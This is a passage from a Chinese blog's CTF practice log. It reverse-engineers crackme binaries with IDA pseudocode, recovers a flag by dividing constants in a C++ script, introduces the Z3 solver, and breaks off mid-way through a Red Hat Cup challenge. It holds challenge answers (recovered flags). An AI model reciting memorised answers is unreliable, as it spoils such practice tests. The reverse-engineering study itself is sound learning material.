class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_40FA80</span><span class="params">(__int64 a1, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v2; <span class="comment">// rbx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">bool</span> v8; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  gcc_va_list va; <span class="comment">// [rsp+8h] [rbp-D0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = off_6CA748;</span><br><span class="line">  v3 = off_6CA748;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)off_6CA748 &amp; <span class="number">0x8000</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _RDX = *((_QWORD *)off_6CA748 + <span class="number">17</span>);</span><br><span class="line">    v6 = __readfsqword(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == *(_QWORD *)(_RDX + <span class="number">8</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = off_6CA748;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    _ESI = <span class="number">1</span>;</span><br><span class="line">    v8 = dword_6CD1BC == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_6CD1BC )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *(_DWORD *)off_6CA748 &amp; <span class="number">0x8000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == _InterlockedCompareExchange((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)_RDX, <span class="number">1</span>, v4) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      __asm &#123; cmpxchg [rdx], esi &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">        _RDX = v2[<span class="number">17</span>];</span><br><span class="line">        v3 = off_6CA748;</span><br><span class="line">        *(_QWORD *)(_RDX + <span class="number">8</span>) = v6;</span><br><span class="line">LABEL_9:</span><br><span class="line">        ++*(_DWORD *)(_RDX + <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_443060(_RDX, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">  v3[<span class="number">29</span>] |= <span class="number">0x10</span>u;</span><br><span class="line">  va_start(va, a1);</span><br><span class="line">  v9 = sub_462860(off_6CA748, a1, va, <span class="number">0LL</span>);</span><br><span class="line">  *((_DWORD *)v2 + <span class="number">29</span>) &amp;= <span class="number">0xFFFFFFEB</span>;</span><br><span class="line">  v10 = v9;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)v2 &amp; <span class="number">0x8000</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v2[<span class="number">17</span>];</span><br><span class="line">    v8 = (*(_DWORD *)(v11 + <span class="number">4</span>))-- == <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(v11 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dword_6CD1BC )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !_InterlockedDecrement((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)v11) )</span><br><span class="line">          <span class="keyword">return</span> v10;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      v8 = (*(_DWORD *)v11)-- == <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_16:</span><br><span class="line">        sub_443090(v11, v9);</span><br><span class="line">        <span class="keyword">return</span> v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到经过若干个判断，他只返回v10并且判断过程中没有对v10进行更改，所以要看第一个对v10进行更改的地方，v10=v9,，而v9又被sub_462860这个函数进行了赋值，跟进看看</p>
<p>打开来看到的是一连串超长的代码，甚至他有6953行</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428174805581-16826752858955.png" alt="image-20230428174805581"></p>
<p>但是整体看完之后，他只返回了-1或是v28，v28又一定是-1（根据分析关于v28的代码得到），但是好像没什么用，还是回到主函数接着看看这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sub_4009AE(&amp;v7) )</span><br><span class="line">   sub_410350(<span class="string">&quot;Correct!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428175127877-16826754886917.png" alt="image-20230428175127877"></p>
<p>这里肯定要返回的是5759124 * a1[31] == 719890500</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_4009AE</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">1629056</span> * *a1 != <span class="number">166163712</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6771600</span> * a1[<span class="number">1</span>] != <span class="number">731332800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3682944</span> * a1[<span class="number">2</span>] != <span class="number">357245568</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10431000</span> * a1[<span class="number">3</span>] != <span class="number">1074393000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3977328</span> * a1[<span class="number">4</span>] != <span class="number">489211344</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5138336</span> * a1[<span class="number">5</span>] != <span class="number">518971936</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7532250</span> * a1[<span class="number">7</span>] != <span class="number">406741500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5551632</span> * a1[<span class="number">8</span>] != <span class="number">294236496</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3409728</span> * a1[<span class="number">9</span>] != <span class="number">177305856</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13013670</span> * a1[<span class="number">10</span>] != <span class="number">650683500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6088797</span> * a1[<span class="number">11</span>] != <span class="number">298351053</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7884663</span> * a1[<span class="number">12</span>] != <span class="number">386348487</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8944053</span> * a1[<span class="number">13</span>] != <span class="number">438258597</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5198490</span> * a1[<span class="number">14</span>] != <span class="number">249527520</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4544518</span> * a1[<span class="number">15</span>] != <span class="number">445362764</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3645600</span> * a1[<span class="number">17</span>] != <span class="number">174988800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10115280</span> * a1[<span class="number">16</span>] != <span class="number">981182160</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9667504</span> * a1[<span class="number">18</span>] != <span class="number">493042704</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5364450</span> * a1[<span class="number">19</span>] != <span class="number">257493600</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13464540</span> * a1[<span class="number">20</span>] != <span class="number">767478780</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5488432</span> * a1[<span class="number">21</span>] != <span class="number">312840624</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">14479500</span> * a1[<span class="number">22</span>] != <span class="number">1404511500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6451830</span> * a1[<span class="number">23</span>] != <span class="number">316139670</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6252576</span> * a1[<span class="number">24</span>] != <span class="number">619005024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7763364</span> * a1[<span class="number">25</span>] != <span class="number">372641472</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7327320</span> * a1[<span class="number">26</span>] != <span class="number">373693320</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8741520</span> * a1[<span class="number">27</span>] != <span class="number">498266640</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8871876</span> * a1[<span class="number">28</span>] != <span class="number">452465676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4086720</span> * a1[<span class="number">29</span>] != <span class="number">208422720</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么大概flag就是a1这个char数组了，是一个很简单的if判断，相除即可还原a1</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230428180750423.png" alt="image-20230428180750423"></p>
<p>注意这里a1[16]和a[17换了位置]，并且没有a[6]这个东西</p>
<p>脚本如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a1[<span class="number">50</span>];</span><br><span class="line">	<span class="built_in">memset</span>(a1, <span class="string">&#x27;\0&#x27;</span>, <span class="number">50</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> a[] = &#123; <span class="number">166163712</span> ,<span class="number">731332800</span>,<span class="number">357245568</span>,<span class="number">1074393000</span>,<span class="number">489211344</span></span><br><span class="line">	,<span class="number">518971936</span>, <span class="number">406741500</span> ,<span class="number">294236496</span> ,<span class="number">177305856</span> ,<span class="number">650683500</span></span><br><span class="line">	,<span class="number">298351053</span> ,<span class="number">386348487</span>,<span class="number">438258597</span>,<span class="number">249527520</span>,<span class="number">445362764</span> ,<span class="number">981182160</span></span><br><span class="line">	,<span class="number">174988800</span></span><br><span class="line">	 ,<span class="number">493042704</span> ,<span class="number">257493600</span>,<span class="number">767478780</span> ,<span class="number">312840624</span></span><br><span class="line">	,<span class="number">1404511500</span> ,<span class="number">316139670</span> ,<span class="number">619005024</span>,<span class="number">372641472</span>,<span class="number">373693320</span></span><br><span class="line">	,<span class="number">498266640</span> ,<span class="number">452465676</span> ,<span class="number">208422720</span>,<span class="number">515592000</span> ,<span class="number">719890500</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> div[] = &#123; <span class="number">1629056</span> ,<span class="number">6771600</span> ,<span class="number">3682944</span> ,<span class="number">10431000</span></span><br><span class="line">	,<span class="number">3977328</span> ,<span class="number">5138336</span> ,<span class="number">7532250</span>,<span class="number">5551632</span>,<span class="number">3409728</span> ,<span class="number">13013670</span></span><br><span class="line">	,<span class="number">6088797</span> ,<span class="number">7884663</span> ,<span class="number">8944053</span> ,<span class="number">5198490</span> ,<span class="number">4544518</span>,<span class="number">10115280</span></span><br><span class="line">	,<span class="number">3645600</span> ,<span class="number">9667504</span> ,<span class="number">5364450</span> ,<span class="number">13464540</span> ,<span class="number">5488432</span> ,<span class="number">14479500</span></span><br><span class="line">	,<span class="number">6451830</span> ,<span class="number">6252576</span> ,<span class="number">7763364</span> ,<span class="number">7327320</span> ,<span class="number">8741520</span></span><br><span class="line">	,<span class="number">8871876</span> ,<span class="number">4086720</span> ,<span class="number">9374400</span> ,<span class="number">5759124</span> &#125;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a1[i] = a[i] / div[i];</span><br><span class="line">		cout &lt;&lt; a1[i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后得出的是flag{e65421110ba03099a1c039337}，但是注意我们这个flag是没有a1[6]的，所以就0-9，a-z，A-Z都试一遍。</p>
<p>最后a1[6]就是1，所以flag就是flag{e165421110ba03099a1c039337}</p>
<p>附：</p>
<p>最后搜寻网上解答是看到了z3解方程的方法，在此处记录下</p>
<h2 id="Z3介绍，什么是Z3？"><a href="#Z3介绍，什么是Z3？" class="headerlink" title="Z3介绍，什么是Z3？"></a>Z3介绍，什么是Z3？</h2><p>Z3是由微软公司开发的一个优秀的SMT求解器，它能够检查逻辑表达式的可满足性，可以用来软件/硬件验证和测试，约束求解，混合系统分析，安全性研究，生物学研究（计算机分析）以及几何问题。通俗的来讲我们可以简单理解为它是一个解方程的计算器，Z3py是使用脚本来解决一些实际问题。</p>
<h2 id="Z3在CTF逆向中有什么用？"><a href="#Z3在CTF逆向中有什么用？" class="headerlink" title="Z3在CTF逆向中有什么用？"></a>Z3在CTF逆向中有什么用？</h2><p>我们在做CTF逆向题的时候，当我们已经逆向到最后求flag或者具体数值解的时候，例如最简单的：我们知道了未知量x,y，也知道了约束条件x+y=5，那么此时我们就可以使用Z3来求解x和y的值，因为x和y的值肯定有多个解，而我们最后的flag肯定只有一个，那么我们就可以继续添加约束条件来减少解的数量，最后得出正确的flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure>

<h2 id="Z3语法简介："><a href="#Z3语法简介：" class="headerlink" title="Z3语法简介："></a>Z3语法简介：</h2><p>Z3在python中主要有以下数据类型：Int –&gt; 整型Bool –&gt; 布尔型Array –&gt; 数组BitVec(‘a’,8) –&gt; char型（其中的数字不一定是8，例如C语言中的int型可以用BitVec(‘a’,32)表示）</p>
<h2 id="几个常用API"><a href="#几个常用API" class="headerlink" title="几个常用API"></a>几个常用API</h2><p><strong>Solver()：</strong>创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解。**<br>**</p>
<p><strong>add()：</strong>添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式。</p>
<p><strong>check()：</strong>通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat。**<br>**</p>
<p><strong>model()：</strong>在存在解的时候，该函数会将每个限制条件所对应的解集取交集，进而得出正解。</p>
<p>问题：假设有两个未知数x和y，已知x+y=5且2x+3y=14,让我们求x和y分别是多少？（可能有的小伙伴会问了，你不会是个傻子吧，这还用编程计算？我口算都能算得出来，这里我只是给大家随便举了个简单的例子，大家别往心里去,主要目的是演示Z3用法 -。-）下面我们按照我们刚才的思路使用Z3进行编写：</p>
<p>1.设未知数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x = Int(&#x27;x&#x27;)</span><br><span class="line">y = Int(&#x27;y&#x27;)</span><br></pre></td></tr></table></figure>

<p>2.列方程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br><span class="line">s.add(x+y==5)</span><br><span class="line">s.add(2*x+3*y==14）</span><br></pre></td></tr></table></figure>

<p>3.解方程判断是否有解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if s.check() == sat:</span><br><span class="line">result = s.model()</span><br></pre></td></tr></table></figure>

<p>4.输出方程的解，没有解则输出无解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print result</span><br><span class="line">else:</span><br><span class="line">print &#x27;无解&#x27;</span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/232002.html">CTF逆向解题辅助工具——Z3约束求解器 - FreeBuf网络安全行业门户</a></p>
<h1 id="12-2019红帽杯-easyRE1"><a href="#12-2019红帽杯-easyRE1" class="headerlink" title="12.[2019红帽杯]easyRE1"></a>12.[2019红帽杯]easyRE1</h1><p>日常检查</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430173858216-16828475388261.png" alt="image-20230430173858216"></p>
<p>拖入ida，查看字符串信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430174646100.png" alt="image-20230430174646100"></p>
<p>这里有一些变量字符串信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430174720012.png" alt="image-20230430174720012"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000004A23A8 aVm0wd2vhuxhtwg db &#x27;Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xV&#x27;</span><br><span class="line">.rodata:00000000004A23A8                                         ; DATA XREF: .data:off_6CC090↓o</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;mpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWx&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;ob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZS&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;R1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1d&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;sWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1Ex&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;WlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGS&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;nJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSl&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;lUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnR&#x27;</span><br><span class="line">.rodata:00000000004A23A8                 db &#x27;lRXRXTVZaSFVsUnNVVlZVTURrPQ==&#x27;,0</span><br></pre></td></tr></table></figure>

<p>来到主函数查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"> v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    